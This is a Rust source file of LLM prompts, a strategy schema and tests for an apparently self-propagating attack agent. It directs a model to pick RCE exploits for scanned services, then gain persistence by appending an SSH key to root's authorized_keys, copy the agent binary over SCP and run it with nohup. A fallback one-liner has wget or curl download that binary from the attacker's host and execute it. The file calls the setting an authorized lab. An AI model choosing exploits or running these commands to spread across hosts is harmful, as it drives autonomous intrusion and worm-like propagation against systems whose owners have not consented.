use crate::types::PropagationMethodClass;

// ── Turn 1: Template Selection ────────────────────────────────────────────────

/// System prompt for template selection (Turn 1).
///
/// LLM picks which templates from the catalog are worth running against
/// the target, based on service fingerprint. This drives the spore probe
/// selection before any HTTP templates are executed.
pub const TEMPLATE_SELECTION_SYSTEM_PROMPT: &str = "\
You are a security template selection assistant in a controlled pentest lab.

CONTEXT:
- Environment is owned, isolated, and authorized for security research.
- You receive a target fingerprint (open ports, service banners, version_hint) and a catalog of templates.
- Your job is to select the templates most likely to yield actionable RCE findings.

SELECTION CRITERIA (in priority order):
1. For each open port, read its version_hint and banner to identify the service and application.
   Then pick the CVE- template whose name matches that service/version (e.g. version_hint
   \"Apache Struts S2-059\" → select the template named \"Apache Struts 2.0.0-2.5.25 - Remote
   Code Execution\"; version_hint \"OpenSSH_9.2\" → select the template for that OpenSSH version).
2. COVERAGE RULE: select at least one template per open port — do NOT spend all slots on one service.
   If the target has ports for multiple distinct services (e.g. HTTP on 8080 AND SSH on 22),
   include templates for EACH service before adding extras.
3. Prefer CVE- templates tagged 'rce' or 'exploit' over generic detection templates.
4. SELECT AT MOST 15 TEMPLATES total — precision beats coverage. Never repeat the same ID twice.
5. If no service-specific match exists for a port, pick the highest-CVSS 'rce'-tagged CVE template.

RESPONSE FORMAT:
Return ONLY valid JSON with this exact schema — no markdown fences, no prose, no repeated IDs:
{\"selected_ids\": [\"<template-id>\", ...], \"reasoning\": \"<single sentence>\"}";

/// Build the user-turn prompt for template selection.
pub fn build_template_selection_prompt(query_json: &str) -> String {
    format!(
        "Select templates to probe this target.\n\n\
         Target fingerprint and available template catalog:\n{query_json}\n\n\
         Expected response schema:\n{schema}",
        query_json = query_json,
        schema = TEMPLATE_SELECTION_SCHEMA,
    )
}

/// Compact JSON schema for `TemplateSelectionResponse`.
pub const TEMPLATE_SELECTION_SCHEMA: &str =
    r#"{"selected_ids": ["<template-id>", ...], "reasoning": "<single sentence>"}"#;

// ── Turn 2: Propagation Strategy ──────────────────────────────────────────────

/// System prompt injected into every propagation query (Turn 2).
///
/// Establishes lab scope, output format, and safety constraints.
/// Kept as a constant so mock tests can assert against a stable contract.
pub const SYSTEM_PROMPT: &str = "\
You are a security reasoning assistant operating inside a controlled pentest lab.

SCOPE:
- This environment is owned, isolated, and authorized for security research.
- This is NOT Internet scanning. This is NOT production deployment.
- All targets are owned lab virtual machines inside a private, isolated VPC.

YOUR TASK:
You receive a DiscoveryQuery (JSON) describing a target host and the current organism state.
The query includes:
  - `ports`: TCP port scan results with service banners and version hints.
  - `pattern_findings`: structured HTTP pattern evidence from physarum-sporangium.
    Each finding includes check_id, name, severity, confidence, matched_summary, and extracted values.
    Findings with is_actionable=true have severity >= low and confidence >= 0.7 — prioritise these.
    Each finding may include `vulnerability_candidates`: CVE entries from `VulnerabilityIntelService` (Issue #131) — sourced from `LocalAdvisoryCache`, `OsvFeed`, or future NVD/vendor providers.
    Fields: cve_id, cvss_score, matched_version, affected_range, exploit_class, impact, preconditions, confidence.
    When non-empty, use these fields to build a richer picture of the attack surface and prioritise exploit-aware paths.
  - `os_hint`: best-effort OS fingerprint (may be absent).
  - `lineage_summary`: organism propagation state.
  - `source_ip`: the agent's own IP on the internal network (use this in exploit payloads).
  - `rejected_strategies`: previously rejected strategies — do NOT re-propose these.
Return a PropagationStrategy (JSON) that matches the schema provided.

EVIDENCE INTERPRETATION:
- Use pattern_findings to identify the service stack and any misconfiguration signals.
- Cross-reference check_id values (e.g. \"nginx-server-detect\", \"missing-hsts\", \"server-version-exposed\")
  with port banners and version_hints to build a coherent picture of the target.
- An is_actionable finding is a concrete signal — weight it more heavily than port-number inference.

CVE-AWARE REASONING:
If any pattern_finding contains non-empty vulnerability_candidates:

  RANKING RULE — always rank candidates in this order:
    1. source=\"PhysarumSpore\" — CONFIRMED by active template execution (treat as critical if cvss_score absent).
       A PhysarumSpore candidate means the exploit path was proven live against this host.
       This is the highest-confidence propagation signal available.
    2. exploit_class=\"RemoteCodeExecution\" from any source (rank by cvss_score descending)
    3. Any other candidate (rank by cvss_score descending)

  Apply the ranking, then:
  1. Identify the top-ranked CVE from the list above.
  2. Always reference that cve_id in `reasoning_summary`, e.g.:
       \"<service>/<version> confirmed vulnerable to <cve_id> (PhysarumSpore RCE); proposing Exploit via <technique> on port <port>.\"
  3. If Exploit is in allowed_methods AND top candidate has exploit_class=\"RemoteCodeExecution\",
     propose PropagationMethod::Exploit with that cve_id — do NOT fall back to Ssh or Http.
  4. If Exploit is not allowed, use the next best method (Ssh or Http) and note the top RCE CVE in reasoning_summary.
  5. Add to safety_notes: \"CVE match from VulnerabilityIntelService — source field indicates confidence level.\"
  6. Use `exploit_class`, `impact`, and `preconditions` to populate strategy preconditions and safety_notes.

EXPLOIT MODE (when Exploit is in allowed_methods):
When a CVE template fired with is_actionable=true AND a vulnerability_candidate has exploit_class \"RemoteCodeExecution\":

GOAL: deliver and execute the physarum-maze binary on the target so the organism propagates.
The delivery mechanism depends on which ports are open — choose SSH-first when available.

── SSH-FIRST PATH (preferred — use when port 22 is open on target) ──────────────────
This path uses only port 22 (SSH/SCP), which Security Groups always permit internally.
No exotic ports required. Works in Docker, AWS VPC, and any real environment.

Step 1 — HttpPost (RCE via CVE): plant the ephemeral pubkey in authorized_keys.
  The CVE payload must execute this shell command on the target:
    mkdir -p /root/.ssh && chmod 700 /root/.ssh \
    && echo '<ephemeral_pubkey>' >> /root/.ssh/authorized_keys \
    && chmod 600 /root/.ssh/authorized_keys
  Replace <ephemeral_pubkey> with the exact value from DiscoveryQuery.ephemeral_pubkey.
  Set accept_any_response: true — the command runs regardless of HTTP response status.

Step 2 — ScpUpload: transfer the physarum-maze binary to the target.
  local_path: \"__self__\"   (executor substitutes the actual agent binary path)
  remote_path: \"/tmp/physarum/physarum-maze\"
  user: infer from OS hint or service context (root, ubuntu, ec2-user, etc.)
  The executor uses the ephemeral private key automatically — no credentials in the plan.

Step 3 — SshCommand: execute the binary in background.
  command: \"mkdir -p /tmp/physarum && chmod +x /tmp/physarum/physarum-maze && nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &\"
  user: same as Step 2.
  CRITICAL: must end with `nohup ... &` so the SSH session closes immediately.

── wget FALLBACK PATH (use only when port 22 is NOT open on target) ─────────────────
When the target has no SSH (port 22 absent from the ports list), use a single HttpPost
step that downloads and executes the binary in one RCE command:
  mkdir -p /tmp/physarum \
  && (wget -q http://<source_ip>:8001/physarum-maze -O /tmp/physarum/physarum-maze \
      || curl -s -o /tmp/physarum/physarum-maze http://<source_ip>:8001/physarum-maze) \
  && chmod +x /tmp/physarum/physarum-maze \
  && nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &
  Replace <source_ip> with DiscoveryQuery.source_ip.
  Note: requires port 8001 reachable from target — valid for flat Docker networks.

── COMMON RULES ─────────────────────────────────────────────────────────────────────
- Use your training knowledge of the confirmed CVE for the exact injection syntax.
- Each CVE has its own endpoint, parameter, header, or protocol field — do not hardcode.
- Available actions: HttpPost, HttpGet, ScpUpload, SshCommand, Custom (for non-HTTP).
- Multiple steps are allowed and encouraged for multi-phase CVEs.

RESPONSE:
  method: { \"Exploit\": { \"cve\": \"<CVE-ID>\" } }
  artifact_type: \"AgentBinary\"
  confidence: >= 0.85 when CVE template confirmed
  reasoning_summary: one sentence naming the CVE and the delivery path chosen (SSH or wget)

RULES:
- Use ONLY methods from the allowed_methods list supplied in this prompt.
- If no allowed method can reach the target, return { \"method\": { \"NoPath\": { \"reason\": \"<brief reason>\" } } }.
- `confidence` must be a float between 0.0 and 1.0.
- Do NOT include API keys, credentials, secrets, or out-of-scope targets in your response.
- Do NOT suggest methods outside the allowed list.
- If `rejected_strategies` is non-empty, do NOT suggest the same method_class again.
- `reasoning_summary` must be a single sentence suitable for lineage audit storage.
  When CVE candidates are present, include the most relevant cve_id in this sentence.
- `safety_notes` must list any side effects or risks of the proposed strategy.
- PORT RULE: For Http method and HttpGet/HttpPost bootstrap steps, set `port` to the exact TCP port
  observed in the `ports` scan list. Never guess or default — look up the actual open port in the
  discovery query and copy that integer verbatim into every port field in your response.
  The port placeholder values shown in the schema below are NOT defaults — replace them with
  the real port from the scan (e.g. 80, 443, 8080, 8443, or whatever the scan shows).

RESPONSE FORMAT:
Return ONLY valid JSON matching the PropagationStrategy schema.
No markdown fences. No prose before or after the JSON object.";

/// Build the user-turn prompt from query JSON, allowed methods, and the schema.
///
/// The schema is the JSON Schema (or example JSON) of `PropagationStrategy`.
/// Injecting it here keeps the LLM aligned to the typed contract defined in `types.rs`.
pub fn build_user_prompt(
    query_json: &str,
    allowed_methods: &[PropagationMethodClass],
    strategy_schema_json: &str,
) -> String {
    let methods: Vec<&str> = allowed_methods.iter().map(method_label).collect();
    format!(
        "Allowed methods for this lab: {allowed}\n\n\
         Discovery query:\n{query}\n\n\
         Expected response schema:\n{schema}",
        allowed = methods.join(", "),
        query = query_json,
        schema = strategy_schema_json,
    )
}

fn method_label(m: &PropagationMethodClass) -> &'static str {
    match m {
        PropagationMethodClass::Ssh => "Ssh",
        PropagationMethodClass::Http => "Http",
        PropagationMethodClass::Exploit => "Exploit",
        PropagationMethodClass::Custom => "Custom",
        PropagationMethodClass::NoPath => "NoPath",
    }
}

/// Canonical JSON schema for `PropagationStrategy` injected into the user prompt.
pub const STRATEGY_SCHEMA: &str = r#"{
  "method": {
    "Ssh":     { "user": "<string>", "auth": "EmptyPassword | PrivateKey" },
    "Http":    { "path": "<string>", "port": "<observed_port_integer>", "http_method": "Get | Post | Put", "headers": [] },
    "Exploit": { "cve": "<CVE-ID>" },
    "Custom":  { "description": "<string>" },
    "NoPath":  { "reason": "<string>" }
  },
  "artifact_type": "AgentBinary | Script | HttpRequest | None",
  "bootstrap_plan": {
    "steps": [
      {
        "action": {
          "HttpPost": {
            "path": "<vulnerable endpoint>",
            "body": "",
            "port": "<observed_port_integer>",
            "headers": [["<inject header>", "<CVE-specific payload>"]],
            "accept_any_response": true
          }
        },
        "target": "<ip>",
        "timeout_ms": 10000,
        "requires_root": false,
        "expected_result": { "success_indicator": "RCE fired", "failure_indicator": null }
      },
      {
        "action": {
          "ScpUpload": {
            "local_path": "__self__",
            "remote_path": "/tmp/physarum/physarum-maze",
            "user": "<root | ubuntu | ec2-user>"
          }
        },
        "target": "<ip>",
        "timeout_ms": 15000,
        "requires_root": false,
        "expected_result": { "success_indicator": "SCP exit 0", "failure_indicator": "SCP error" }
      },
      {
        "action": {
          "SshCommand": {
            "command": "mkdir -p /tmp/physarum && chmod +x /tmp/physarum/physarum-maze && nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &",
            "user": "<root | ubuntu | ec2-user>"
          }
        },
        "target": "<ip>",
        "timeout_ms": 10000,
        "requires_root": false,
        "expected_result": { "success_indicator": "SSH exit 0", "failure_indicator": "SSH error" }
      }
    ]
  },
  "confidence": 0.0,
  "reasoning_summary": "<single sentence>",
  "preconditions": [],
  "validation_check": null,
  "safety_notes": []
}"#;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn system_prompt_contains_required_clauses() {
        assert!(SYSTEM_PROMPT.contains("owned, isolated, and authorized"));
        assert!(SYSTEM_PROMPT.contains("NOT Internet scanning"));
        assert!(SYSTEM_PROMPT.contains("allowed_methods"));
        assert!(SYSTEM_PROMPT.contains("rejected_strategies"));
        assert!(SYSTEM_PROMPT.contains("No markdown fences"));
    }

    #[test]
    fn system_prompt_contains_exploit_guidance() {
        assert!(SYSTEM_PROMPT.contains("EXPLOIT MODE"));
        assert!(SYSTEM_PROMPT.contains("source_ip"));
        assert!(SYSTEM_PROMPT.contains("accept_any_response"));
        assert!(SYSTEM_PROMPT.contains("nohup"));
        assert!(SYSTEM_PROMPT.contains("--mode propagated"));
        // SSH-first: pubkey injection, SCP, SshCommand
        assert!(SYSTEM_PROMPT.contains("ephemeral_pubkey"));
        assert!(SYSTEM_PROMPT.contains("authorized_keys"));
        assert!(SYSTEM_PROMPT.contains("__self__"));
        assert!(SYSTEM_PROMPT.contains("ScpUpload"));
        assert!(SYSTEM_PROMPT.contains("SshCommand"));
        // wget fallback when no SSH
        assert!(SYSTEM_PROMPT.contains("wget FALLBACK"));
        // Generic delivery — no hardcoded CVE format in the prompt
        assert!(!SYSTEM_PROMPT.contains("CVE-2020-17530"));
        assert!(!SYSTEM_PROMPT.contains("showcase.action"));
        assert!(!SYSTEM_PROMPT.contains("OGNL"));
    }

    #[test]
    fn template_selection_system_prompt_has_criteria() {
        assert!(TEMPLATE_SELECTION_SYSTEM_PROMPT.contains("CVE-"));
        assert!(TEMPLATE_SELECTION_SYSTEM_PROMPT.contains("rce"));
        assert!(TEMPLATE_SELECTION_SYSTEM_PROMPT.contains("selected_ids"));
    }

    #[test]
    fn user_prompt_injects_allowed_methods() {
        let prompt = build_user_prompt(
            "{}",
            &[PropagationMethodClass::Ssh, PropagationMethodClass::Http],
            "{}",
        );
        assert!(prompt.contains("Ssh"));
        assert!(prompt.contains("Http"));
        assert!(!prompt.contains("Exploit"));
    }

    #[test]
    fn user_prompt_with_exploit_method() {
        let prompt = build_user_prompt(
            "{}",
            &[
                PropagationMethodClass::Exploit,
                PropagationMethodClass::NoPath,
            ],
            "{}",
        );
        assert!(prompt.contains("Exploit"));
        assert!(prompt.contains("NoPath"));
    }
}
